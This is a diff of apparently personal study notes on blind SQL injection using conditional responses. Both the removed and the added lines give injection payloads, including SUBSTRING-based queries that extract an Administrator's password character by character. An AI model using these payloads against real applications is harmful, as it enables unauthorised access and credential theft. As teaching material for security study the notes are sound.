@@ -113,19 +113,32 @@ Blind SQL injection occurs when an application is vulnerable to SQL injection, b
 
 ### <mark style="color:yellow;">Triggering conditional responses</mark>
 
-* `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
-  * …xyz' AND '1'='1
-    * The query return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
-  * …xyz' AND '1'='2
-    * The query do not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
-* Extract data one piece at a time
-  * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
-    * This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`
-  * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
-    * This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
-  * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
-    * ... Confirm that the first character of the password is `s`
-  * We can continue this process to systematically determine the full password for the Administrator user.
+**Detection**
+
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+* `xyz' AND '1'='1`
+* `xyz' AND '1'='2`
+
+See differences in response. Pay attention to small changes that you might not even see in the render! Use Burp's comparer
+
+**Extract data one piece at a time**
+
+First way
+
+* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+  * This returns the message that indicate that the injected condition is true, and so the first character of the password is greater than `m`
+* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
+  * This returns the message that indicate that the injected condition is false, and so the first character of the password is not greater than `t`.
+
+Second way
+
+* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
+  * See the response to confirm that the first character of the password is `s`
+
+We can continue this process to systematically extract data.
 
 ### <mark style="color:yellow;">Error-based SQL injection</mark>
 
